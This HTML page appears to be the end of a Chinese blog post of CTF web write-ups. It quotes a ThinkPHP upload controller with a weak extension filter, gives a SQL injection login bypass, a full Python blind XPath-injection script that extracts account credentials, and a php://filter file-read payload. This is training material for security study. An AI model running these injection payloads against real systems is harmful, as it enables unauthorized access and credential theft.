+<h1 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h1><p>审代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">namespace Home\Controller;</span><br><span class="line"></span><br><span class="line">use Think\Controller;</span><br><span class="line"></span><br><span class="line">class IndexController extends Controller</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">    &#125;</span><br><span class="line">    public function upload()</span><br><span class="line">    &#123;</span><br><span class="line">        $uploadFile = $_FILES[&#x27;file&#x27;] ;</span><br><span class="line">        </span><br><span class="line">        if (strstr(strtolower($uploadFile[&#x27;name&#x27;]), &quot;.php&quot;) ) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = new \Think\Upload();// 实例化上传类</span><br><span class="line">        $upload-&gt;maxSize  = 4096 ;// 设置附件上传大小</span><br><span class="line">        $upload-&gt;allowExts  = array(&#x27;jpg&#x27;, &#x27;gif&#x27;, &#x27;png&#x27;, &#x27;jpeg&#x27;);// 设置附件上传类型</span><br><span class="line">        $upload-&gt;rootPath = &#x27;./Public/Uploads/&#x27;;// 设置附件上传目录</span><br><span class="line">        $upload-&gt;savePath = &#x27;&#x27;;// 设置附件上传子目录</span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        if(!$info) &#123;// 上传错误提示错误信息</span><br><span class="line">          $this-&gt;error($upload-&gt;getError());</span><br><span class="line">          return;</span><br><span class="line">        &#125;else&#123;// 上传成功 获取上传文件信息</span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,1).$info[&#x27;file&#x27;][&#x27;savepath&#x27;].$info[&#x27;file&#x27;][&#x27;savename&#x27;] ;</span><br><span class="line">          echo json_encode(array(&quot;url&quot;=&gt;$url,&quot;success&quot;=&gt;1));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<h1 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h1><p>进入了网页告诉我们ban掉了一批sql用的关键词，看来是sql注入了，但这题挺离谱的，万能密码注进去就返回flag了，有点没看懂。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 || 1=1 limit 0,1</span><br></pre></td></tr></table></figure>
+
+<h1 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h1><p>进网页上来一个登录框，fuzz一下发现不是sql，抓包发现是一个xml，那么先怀疑xxe，但是没有明显的注入点，而且进行登录的话xxe明显不适用，那么就怀疑xpath注入了。</p>
+<p>关于xpath可以参考下面这篇文章：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/8554749.html">xpath注入详解</a></p>
+<p>那么就是一层一层扒到存有账号与密码的节点，并且读取出数据进行登录应该就可以了，直接网上找exp了，不是很想自己写：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">url = &quot;http://e6bcddf2-8f0b-411a-ba79-90a1b4820660.node3.buuoj.cn&quot;</span><br><span class="line">chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span><br><span class="line">head = &#123;</span><br><span class="line">    #&#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36&#x27;,</span><br><span class="line">    &#x27;Content-Type&#x27;: &#x27;application/xml&#x27;,</span><br><span class="line">    #&quot;Cookie&quot;:&quot;UM_distinctid=1785326510411f-0b3fb285b5c49c-4c3f227c-144000-178532651052c9; session=b953d436-f0da-4e58-be79-22676707c609.K5TbTAnwLyhIU66duiTX1Usn1D8; PHPSESSID=dd258b30ebc3b42c352a92ed98092b1c&quot;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">find = re.compile(r&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;&#x27;,re.S)</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">#猜测根节点名称</span><br><span class="line">payload_1 = &quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span><br><span class="line">#猜测子节点名称</span><br><span class="line">payload_2 = &quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span><br><span class="line">#猜测accounts的节点</span><br><span class="line">payload_3 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span><br><span class="line">#猜测user节点</span><br><span class="line">payload_4 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span><br><span class="line">#跑用户名和密码</span><br><span class="line">payload_username =&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span><br><span class="line">payload_password =&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span><br><span class="line"></span><br><span class="line">def get_token():     #获取token的函数</span><br><span class="line">    resp = session.get(url=url)  #如果在这里用headers会得到超时的界面</span><br><span class="line">    token = find.findall(resp.text)[0]</span><br><span class="line">    #print(token)</span><br><span class="line">    return token</span><br><span class="line"></span><br><span class="line">for x in range(1,100):</span><br><span class="line">    for char in chars:</span><br><span class="line">        time.sleep(0.3)</span><br><span class="line">        token = get_token()</span><br><span class="line">        playload = payload_1.format(x, char, token)   #根据上面的playload来改</span><br><span class="line">        #print(playload)</span><br><span class="line">        resp = session.post(url=url,headers=head, data=playload)</span><br><span class="line">        #print(resp.text)</span><br><span class="line">        if &quot;非法操作&quot; in resp.text:</span><br><span class="line">            result += char</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br><span class="line">    if &quot;用户名或密码错误&quot; in resp.text:</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
+
+<p>得到账号密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=adm1n，password=cf7414b5bdb2e65ee43083f4ddbc4d9f</span><br></pre></td></tr></table></figure>
+
+<p>将密码进行somd5解码得到密码为gtfly123，登陆进去后页面什么都无，查看源码发现base64，解码后告诉我们flag在/flag中。url存在file参数，说明可能存在文件读取，直接读取flag失败，伪代码读取成功，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Php://filter/convert.Base64-encode/resource=/flag</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web-write-up-ctf/" rel="tag"># -web -write up -ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/07/07/Thinkphp%E6%A1%86%E6%9E%B6%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%A1%E8%AE%A1/" rel="next" title="Thinkphp框架原理及简单审计">
+                <i class="fa fa-chevron-left"></i> Thinkphp框架原理及简单审计
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">77</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HFCTF2020-JustEscape"><span class="nav-number"></span> <span class="nav-text">[HFCTF2020]JustEscape</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HFCTF2020-BabyUpload"><span class="nav-number"></span> <span class="nav-text">[HFCTF2020]BabyUpload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#EasyBypass"><span class="nav-number"></span> <span class="nav-text">EasyBypass</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RoarCTF-2019-Simple-Upload"><span class="nav-number"></span> <span class="nav-text">[RoarCTF 2019]Simple Upload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RootersCTF2019-babyWeb"><span class="nav-number"></span> <span class="nav-text">[RootersCTF2019]babyWeb</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NPUCTF2020-ezlogin"><span class="nav-number"></span> <span class="nav-text">[NPUCTF2020]ezlogin</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
